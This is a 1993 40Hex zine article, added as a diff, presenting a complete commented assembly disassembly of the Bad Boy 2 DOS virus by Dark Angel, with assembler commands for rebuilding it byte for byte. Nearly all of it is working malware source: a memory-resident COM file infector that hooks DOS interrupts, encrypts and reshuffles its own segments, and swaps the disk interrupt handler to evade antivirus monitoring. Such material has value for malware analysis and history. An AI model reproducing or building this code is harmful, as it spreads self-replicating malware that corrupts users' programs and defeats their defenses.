@@ -1,0 +1,514 @@
+40Hex Issue 10 Volume 3 Number 1                                      File 006
+
+The following is the Bad Boy 2 virus. Patricia M. Hoffman's VSUM is clearly
+not a good source of virus description, so we will not bother including its
+utterly useless description of the virus here.  Bad Boy 2 is a resident COM
+infector.  After 10 infections, it turns itself off.   Although most of the
+code is written well, there are still a few bugs and inconsistencies in it.
+It implements several well-known stealth techniques, including playing with
+the system file table.  It is a segmented virus, with variable placement of
+each segment when it infects a file.  Thus the locations of each segment in
+the virus relative to each other changes upon each infection.
+
+For a byte-to-byte match up of the original, assemble with the following:
+        tasm badboy2.asm
+        tlink /t badboy2.asm
+Note only one pass is required.
+
+                                        Dark Angel
+                                        Phalcon/Skism 1993
+
+-------------------------------------------------------------------------------
+                .model tiny
+                .code
+                org     100h
+; Bad Boy 2 virus
+; Disassembly done by Dark Angel of Phalcon/Skism
+; For 40Hex Issue 10 Volume 3 Number 1
+start:
+                push    cs:startviruspointer            ; save on stack for
+                push    cs                              ; return
+                pop     ds
+                jmp     word ptr cs:encryptpointer      ; decrypt virus
+endstart:
+
+curpointer      dw      0
+infcounter      db      0
+filesize        dw      2
+filetime        dw      0
+filedate        dw      0
+
+origint21       dw      0, 0
+DOSdiskOFF      dw      0
+DOSdiskSEG      dw      0
+oldint21        dw      0, 0
+
+oldint24        dw      0, 0
+
+; The parts of the virus are here
+encryptpointer          dw      offset carrierencrypt
+startviruspointer       dw      offset startvirus
+installpointer          dw      offset install
+exitviruspointer        dw      offset exitvirus
+restoreint21pointer     dw      offset restoreint21
+int24pointer            dw      offset int24
+int21pointer            dw      offset int21
+infectpointer           dw      offset infect
+
+encryptlength           dw      endencrypt-encrypt
+startviruslength        dw      endstartvirus-startvirus
+installlength           dw      endinstall-install
+exitviruslength         dw      endexitvirus-exitvirus
+restoreint21length      dw      endrestoreint21-restoreint21
+int24length             dw      endint24-int24
+int21length             dw      endint21-int21
+infectlength            dw      endinfect-infect
+
+
+enddata:
+
+encrypt: ; and decrypt
+                mov     bx,offset startviruspointer
+                mov     cx,6
+do_next_segment:
+                cmp     bx,offset int24pointer
+                jne     not_int24pointer
+                add     bx,2
+not_int24pointer:
+                push    bx
+                push    cx
+                mov     ax,[bx]                 ; get start offset
+                mov     cx,[bx+encryptlength-encryptpointer] ; and length
+                mov     bx,ax
+encrypt_segment:
+                xor     [bx],al                 ; encrypt cx bytes
+                inc     bx
+                loop    encrypt_segment
+
+                pop     cx
+                pop     bx
+                add     bx,2                    ; go to next segment
+                loop    do_next_segment
+                retn
+endencrypt:
+
+startvirus:
+                mov     es,cs:[2]               ; get top of memory
+                mov     di,100h                 ; check if virus
+                mov     si,100h                 ; already resident
+                mov     cx,offset endstart - offset start - 1
+                rep     cmpsb
+                jnz     not_installed           ; continue if not
+                jmp     cs:exitviruspointer     ; otherwise, quit
+not_installed:
+                mov     ax,cs                   ; get current program's
+                dec     ax                      ; MCB
+                mov     ds,ax
+                cmp     byte ptr ds:[0],'Z'     ; check if last one
+                ;nop
+                je      is_last_MCB             ; continue if so
+                jmp     cs:exitviruspointer     ; otherwise, quit
+is_last_MCB:
+                rsize    = ((endvirus - start + 15)/16+1)*3 ; resident size in
+                                                ; paragraphs
+                sub     word ptr ds:[3],rsize   ; decrease MCB's memory
+                mov     ax,es                   ; get segment of high memory
+                sub     ax,rsize                ; decrease by virus size
+                mov     es,ax                   ; es = start segment of virus
+                mov     ds:[12h],ax             ; put value in PSP top of
+                                                ; memory field
+                push    cs
+                pop     ds
+                mov     cs:infcounter,0         ; clear infection counter
+                mov     di,100h
+                mov     cx,offset enddata - offset start
+                mov     si,100h
+                rep     movsb
+                mov     bx,cs:encryptpointer
+                add     bx,encrypt_segment-encrypt+1
+                xor     byte ptr [bx],18h       ; change to: xor [bx],bl
+
+; shuffling segments to different locations
+                mov     cx,8
+                mov     curpointer,offset encrypt
+shuffle:
+                push    cx
+                call    random_segment
+                push    bx
+                mov     ax,[bx]
+                push    ax
+                add     bx,encryptlength-encryptpointer
+                mov     cx,[bx]
+                pop     si
+                pop     bx
+                xchg    di,curpointer
+                mov     es:[bx],di              ; copy segment
+                rep     movsb                   ; to memory area
+                xchg    di,curpointer
+                mov     ax,8000h
+                or      [bx],ax                 ; mark already copied
+                pop     cx
+                loop    shuffle
+
+                mov     cl,8
+                not     ax                      ; ax = 7FFFh
+                mov     bx,offset encryptpointer
+clear_hibit:                                    ; restore the pointers
+                and     [bx],ax
+                add     bx,2
+                loop    clear_hibit
+
+                jmp     cs:installpointer
+
+random_segment:
+                push    cx
+                push    es
+                xor     cx,cx
+                mov     es,cx
+random_segment_loop:
+                mov     bx,es:[46Ch]            ; get timer ticks since
+                                                ; midnight MOD 8
+                db      081h,0e3h,7,0           ; and bx,7
+                shl     bx,1                    ; multiply by 2
+                add     bx,offset encryptpointer
+                test    word ptr [bx],8000h     ; check if already moved
+                jnz     random_segment_loop     ; do it again if so
+                pop     es
+                pop     cx
+                retn
+endstartvirus:
+
+install:
+                xor     ax,ax
+                mov     ds,ax                   ; ds->interrupt table
+                mov     ax,ds:21h*4             ; save old int 21h handler
+                mov     es:oldint21,ax
+                mov     ax,ds:21h*4+2
+                mov     word ptr es:oldint21+2,ax
+                mov     ah,30h                  ; get DOS version
+                int     21h
+
+                cmp     ax,1E03h                ; 3.X?
+                jne     not_DOS_3X              ; skip if not
+                mov     es:origint21,1460h      ; use known value for int 21h
+                mov     ax,1203h                ; get DOS segment
+                push    ds
+                int     2Fh
+
+                mov     word ptr es:origint21+2,ds
+                pop     ds
+                jmp     short is_DOS_3X
+                nop
+not_DOS_3X:
+                mov     ax,ds:21h*4
+                mov     es:origint21,ax
+                mov     ax,ds:21h*4+2
+                mov     word ptr es:origint21+2,ax
+is_DOS_3X:
+                cli                             ; set new int 21h handler
+                mov     ax,es:int21pointer
+                mov     ds:21h*4,ax
+                mov     ax,es
+                mov     ds:21h*4+2,ax
+                sti
+                mov     cx,es
+                mov     ah,13h                  ; get old DOS disk handler
+                int     2Fh                     ; to es:bx
+
+                push    es
+                mov     es,cx
+                mov     es:DOSdiskOFF,dx
+                mov     es:DOSdiskSEG,ds
+                pop     es
+                int     2Fh                     ; restore DOS disk handler
+                jmp     cs:exitviruspointer
+endinstall:
+
+exitvirus:
+                push    cs                      ; copy return routine to
+                push    cs                      ; buffer at end of file
+                pop     ds                      ; and transfer control
+                pop     es                      ; to it
+                mov     si,cs:exitviruspointer
+                add     si,offset return_to_COM - offset exitvirus
+                ;nop
+                mov     di,cs:filesize
+                add     di,offset endvirus
+                push    di
+                mov     cx,offset end_return_to_COM - offset return_to_COM
+                cld
+                rep     movsb
+                retn                            ; jmp to return_to_COM
+
+return_to_COM:
+                mov     si,cs:filesize
+                add     si,100h
+                cmp     si,offset endvirus      ; check if small file
+                jae     not_negative            ; if not, skip next
+                mov     si,offset endvirus      ; adjust for too small
+not_negative:
+                mov     di,100h
+                mov     cx,offset endvirus - offset start - 1 ; ????
+                rep     movsb                   ; copy old file to start
+                mov     ax,100h                 ; and exit the virus
+                push    ax
+                retn
+end_return_to_COM:
+
+endexitvirus:
+
+restoreint21:
+                xor     di,di
+                mov     ds,di
+                cli
+                mov     di,cs:oldint21
+                mov     ds:21h*4,di
+                mov     di,word ptr cs:oldint21+2
+                mov     ds:21h*4+2,di
+                sti
+                retn
+
+plea            db      'Make me better!'
+
+endrestoreint21:
+
+int24:
+                mov     al,3
+                iret
+
+message         db      'The Bad Boy virus, Version 2.0, Copyright (C) 1991.',0
+
+endint24:
+
+int21:
+                push    bx
+                push    si
+                push    di
+                push    es
+                push    ax
+                cmp     ax,4B00h                ; check if execute
+                jz      execute                 ; continue if so
+                jmp     short exitint21
+                nop
+execute:
+                push    ds
+                push    cs
+                pop     es
+                xor     ax,ax
+                mov     ds,ax
+                mov     si,24h*4                ; get old int 24h
+                mov     di,offset oldint24      ; handler
+                movsw
+                movsw
+                mov     ax,cs:int24pointer
+                cli                             ; set new critical error
+                mov     ds:24h*4,ax             ; handler
+                mov     ax,cs
+                mov     ds:24h*4+2,ax
+                sti
+                pop     ds
+                mov     ax,3D00h                ; open file read only
+                pushf
+                call    dword ptr cs:oldint21
+                jc      restore_exitint21
+                mov     bx,ax                   ; handle to bx
+                call    cs:infectpointer
+                pushf
+                mov     ah,3eh                  ; close file
+                pushf
+                call    dword ptr cs:oldint21
+                popf
+                jc      restore_exitint21
+                push    ds
+                cli                             ; subvert nasty disk
+                xor     ax,ax                   ; monitoring programs
+                mov     ds,ax
+                mov     ax,cs:DOSdiskOFF
+                xchg    ax,ds:13h*4
+                mov     cs:DOSdiskOFF,ax
+                mov     ax,cs:DOSdiskSEG
+                xchg    ax,ds:13h*4+2
+                mov     cs:DOSdiskSEG,ax
+                sti
+                pop     ds
+restore_exitint21:
+                push    ds
+                xor     ax,ax
+                mov     ds,ax
+                mov     ax,cs:oldint24
+                mov     ds:24h*4,ax
+                mov     ax,word ptr cs:oldint24+2
+                mov     ds:24h*4+2,ax
+                pop     ds
+exitint21:
+                pop     ax
+                pop     es
+                pop     di
+                pop     si
+                pop     bx
+                jmp     dword ptr cs:oldint21
+endint21:
+
+infect:
+                push    cx
+                push    dx
+                push    ds
+                push    es
+                push    di
+                push    bp
+                push    bx
+                mov     ax,1220h                ; get JFT entry for file
+                int     2Fh                     ; handle bx
+
+                mov     bl,es:[di]
+                xor     bh,bh
+                mov     ax,1216h                ; get associated SFT
+                int     2Fh                     ; entry to es:di
+
+                pop     bx
+                mov     ax,es:[di+11h]          ; get file size
+                cmp     ax,0F000h               ; exit if too large
+                jb      not_too_large
+                jmp     errorinfect
+not_too_large:
+                mov     word ptr es:[di+2],2    ; set to read/write mode
+                mov     ax,es:[di+11h]          ; get file size (again)
+                mov     cs:filesize,ax          ; save it
+                mov     ax,es:[di+0Dh]          ; get file time
+                mov     cs:filetime,ax          ; save it
+                mov     ax,es:[di+0Fh]          ; get file date
+                mov     cs:filedate,ax          ; save it
+                push    cs
+                pop     ds
+                mov     dx,4E9h
+                mov     cx,3E8h
+                mov     ah,3Fh                  ; Read from file
+                pushf
+                call    dword ptr cs:oldint21
+                jnc     read_ok
+                jmp     errorinfect
+read_ok:
+                mov     bp,ax
+                mov     si,dx
+                mov     ax,'MZ'                 ; check if EXE
+                cmp     ax,[si]
+                jne     not_MZ
+                jmp     errorinfect
+not_MZ:
+                xchg    ah,al
+                cmp     ax,[si]                 ; check if EXE
+                jne     not_ZM
+                jmp     errorinfect
+not_ZM:
+                push    es
+                push    di
+                push    cs
+                pop     es
+                mov     si,100h                 ; check if already
+                mov     di,dx                   ; infected
+                mov     cx,offset endstart - offset start - 1
+                repe    cmpsb
+                pop     di
+                pop     es
+                jnz     not_already_infected
+                jmp     errorinfect
+not_already_infected:
+                mov     word ptr es:[di+15h],0
+                push    es
+                push    di
+                mov     si,cs:infectpointer
+                add     si,offset write_virus - offset infect
+                xor     di,di
+                push    cs
+                pop     es
+                mov     cx,offset end_write_virus-offset write_virus
+                cld
+                rep     movsb
+                pop     di
+                pop     es
+                mov     si,cs:infectpointer
+                add     si,offset finish_infect - offset infect
+                push    si
+                xor     si,si
+                push    si
+                push    ds
+                cli                             ; subvert nasty
+                xor     ax,ax                   ; antivirus programs
+                mov     ds,ax
+                mov     ax,cs:DOSdiskOFF
+                xchg    ax,ds:13h*4
+                mov     cs:DOSdiskOFF,ax
+                mov     ax,cs:DOSdiskSEG
+                xchg    ax,ds:13h*4+2
+                mov     cs:DOSdiskSEG,ax
+                sti
+                pop     ds
+                retn
+
+write_virus:
+                push    bx
+                call    cs:encryptpointer       ; encrypt virus
+                pop     bx
+                mov     dx,100h
+                mov     ah,40h                  ; write virus
+                mov     cx,offset endvirus - offset start
+                pushf
+                call    dword ptr cs:origint21
+                pushf
+                push    bx
+                call    cs:encryptpointer       ; decrypt virus
+                pop     bx
+                popf
+                jnc     write_OK
+                pop     ax
+                mov     ax,cs:infectpointer
+                add     ax,offset infectOK - offset infect
+                push    ax
+                retn
+write_OK:
+                mov     ax,es:[di+11h]          ; move file pointer
+                mov     es:[di+15h],ax          ; to end of file
+                mov     dx,offset endvirus
+                mov     cx,bp
+                mov     ah,40h                  ; concatenate carrier
+                pushf                           ; file's first few bytes
+                call    dword ptr cs:origint21
+                retn
+end_write_virus:
+
+finish_infect:
+                mov     ax,5701h                ; restore file time/date
+                mov     cx,cs:filetime
+                mov     dx,cs:filedate
+                pushf
+                call    dword ptr cs:oldint21
+                inc     cs:infcounter
+                cmp     cs:infcounter,10d       ; after 10 infections,
+                jne     infectOK
+                call    cs:restoreint21pointer  ; turn off virus
+                jmp     short infectOK
+errorinfect:
+                stc                             ; set error flag
+                jmp     short exitinfect
+infectOK:
+                clc                             ; clear error flag
+exitinfect:
+                pop     bp
+                pop     di
+                pop     es
+                pop     ds
+                pop     dx
+                pop     cx
+                retn
+endinfect:
+                db      0
+endvirus:
+                int     20h
+
+carrierencrypt:
+                mov     word ptr cs:encryptpointer,offset encrypt
+                retn
+
+                end     start
+-------------------------------------------------------------------------------
+                                                                             DA
